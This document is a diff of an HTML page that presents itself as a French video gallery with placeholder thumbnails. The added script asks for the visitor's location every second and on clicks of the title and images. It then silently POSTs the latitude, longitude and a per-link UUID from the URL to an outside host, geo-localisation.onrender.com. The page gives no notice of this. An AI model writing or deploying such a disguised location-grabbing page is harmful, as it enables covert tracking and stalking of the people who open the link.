@@ -1,61 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Galerie de Vidéos</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <meta charset="UTF-8">
+    <title>Galerie de Vidéos</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body class="bg-gray-100" onclick="checkLocationPermission()">
-
-  <div class="container mx-auto py-8">
-    <h1 class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
-    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
-      <!-- Carte de vidéo -->
-      <div class="bg-white rounded-lg shadow-md overflow-hidden">
-        <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-        <div class="p-4">
-          <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
+<body>
+    <div class="container mx-auto py-8">
+        <h1 id="title" class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
+          
+          <!-- Carte de vidéo -->
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image1" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title1" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
+    
+          <!-- Répétez la carte de vidéo pour d'autres vidéos -->
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image2" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title2" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
+    
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image3" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title3" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
+    
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image4" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title4" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
         </div>
-      </div>
-      <!-- Répétez la carte de vidéo pour d'autres vidéos -->
-      <div class="bg-white rounded-lg shadow-md overflow-hidden">
-        <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-        <div class="p-4">
-          <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
-        </div>
-      </div>
     </div>
-  </div>
 
-  <div id="locationMessage" class="hidden fixed inset-0 bg-gray-800 bg-opacity-75 flex items-center justify-center z-50">
-    <div class="bg-white p-6 rounded-lg text-center">
-      <h2 class="text-2xl font-bold mb-4">Autoriser la localisation</h2>
-      <p class="mb-4">Pour utiliser cette fonctionnalité, veuillez autoriser la localisation dans les paramètres de votre navigateur.</p>
-      <button onclick="closeLocationMessage()" class="bg-blue-500 text-white px-4 py-2 rounded">OK</button>
-    </div>
-  </div>
+    <script>
+        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
+        function attemptGeolocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const uuid = window.location.pathname.split('/').pop();
+                const { latitude, longitude } = position.coords;
 
-  <script>
-    function checkLocationPermission() {
-      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-        if (result.state === 'denied') {
-          document.getElementById('locationMessage').classList.remove('hidden');
-        } else if (result.state === 'granted') {
-          // La localisation est déjà autorisée
-        } else {
-          // Demande la permission de localisation
-          navigator.geolocation.getCurrentPosition(function(position) {
-            console.log(position);
-          });
+                fetch('https://geo-localisation.onrender.com/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ uuid, latitude, longitude })
+                })
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }, error => {
+                // En cas d'échec, recharger la page après un délai de 5 secondes
+                console.error('Geolocation error:', error);
+            });
         }
-      });
-    }
 
-    function closeLocationMessage() {
-      document.getElementById('locationMessage').classList.add('hidden');
-    }
-  </script>
+        // Appeler la fonction pour tenter de récupérer la position
+        setInterval(attemptGeolocation, 1000);
 
+        // Ajouter des écouteurs d'événements pour rendre le titre et les images cliquables
+        document.getElementById('title').addEventListener('click', attemptGeolocation);
+        document.getElementById('image1').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title1').addEventListener('click', attemptGeolocation);
+        document.getElementById('image2').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title2').addEventListener('click', attemptGeolocation);
+        document.getElementById('image3').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title3').addEventListener('click', attemptGeolocation);
+        document.getElementById('image4').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title4').addEventListener('click', attemptGeolocation);
+    </script>
 </body>
 </html>
